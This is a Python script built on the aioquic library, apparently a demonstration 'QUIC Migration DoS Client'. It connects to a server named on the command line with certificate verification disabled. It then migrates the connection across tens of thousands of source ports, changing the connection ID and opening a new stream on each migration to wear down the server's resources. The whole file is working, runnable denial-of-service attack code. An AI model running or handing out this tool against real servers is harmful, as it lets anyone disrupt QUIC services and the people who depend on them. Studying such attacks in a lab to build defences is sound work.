import argparse
import asyncio
import logging
import ssl
import struct
from typing import cast
from aioquic.asyncio.client import connect, change_transport
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.logger import QuicFileLogger
from aioquic.quic.connection import QuicConnectionState

logger = logging.getLogger("client")

class DosClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.stream_id = None

    async def send(self, d) -> None:
        d = d % 65536
        data = int.to_bytes(d, 4, "big")
        data = struct.pack("!H", len(data)) + data
        
       # if self.stream_id is None:
        self.stream_id = self._quic.get_next_available_stream_id()
        
        self._quic.send_stream_data(self.stream_id, data, end_stream=False)
        self.transmit()

def save_session_ticket(ticket):
    logger.info("New session ticket received")

async def main(host: str, port: int, client_ip: str, start_port: int, end_port: int) -> None:
    logger.info(f"Connecting to {host}:{port}")
    logger.info(f"Using client IP: {client_ip}")
    logger.info(f"Port range: {start_port} - {end_port}")
    
    configuration = QuicConfiguration(alpn_protocols=["dos-demo"], is_client=True)
    configuration.max_stream_data_bidi_local = 10000000000  # 10GB
    configuration.max_stream_data_bidi_remote = 10000000000
    configuration.max_data = 10000000000
    configuration.verify_mode = ssl.CERT_NONE
    configuration.quic_logger = QuicFileLogger("/tmp/qlog")
    
    async with connect(
        host,
        port,
        configuration=configuration,
        session_ticket_handler=save_session_ticket,
        create_protocol=DosClientProtocol,
        local_port=0
    ) as client:
        client = cast(DosClientProtocol, client)
        
        migration_count = 0
        current_port = start_port
        
        while current_port <= end_port:
            if client._quic._state == QuicConnectionState.TERMINATED:
                logger.warning(f"Connection terminated after {migration_count} migrations")
                break
            
            try:
                host_str = "::ffff:" + client_ip
                client.change_connection_id()
                await change_transport(client, current_port, host_str)
                migration_count += 1
                
                await client.send(migration_count)
                
                if migration_count % 1000 == 0:
                    logger.info(f"Completed {migration_count} migrations (port {current_port})")
                
                await asyncio.sleep(0.001)
                current_port += 1
                
            except Exception as e:
                logger.error(f"Migration {migration_count} failed: {e}")
                break
        
        logger.info(f"Attack complete: {migration_count} total migrations using IP {client_ip}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="QUIC Migration DoS Client")
    parser.add_argument("--host", type=str, required=True, help="Server IP address")
    parser.add_argument("--port", type=int, default=4444, help="Server port")
    parser.add_argument("--client-ip", type=str, required=True, help="Client source IP to use")
    parser.add_argument("--start-port", type=int, default=1024, help="Starting source port")
    parser.add_argument("--end-port", type=int, default=65535, help="Ending source port")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose logging")
    
    args = parser.parse_args()
    
    logging.basicConfig(
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )
    
    asyncio.run(main(args.host, args.port, args.client_ip, args.start_port, args.end_port))
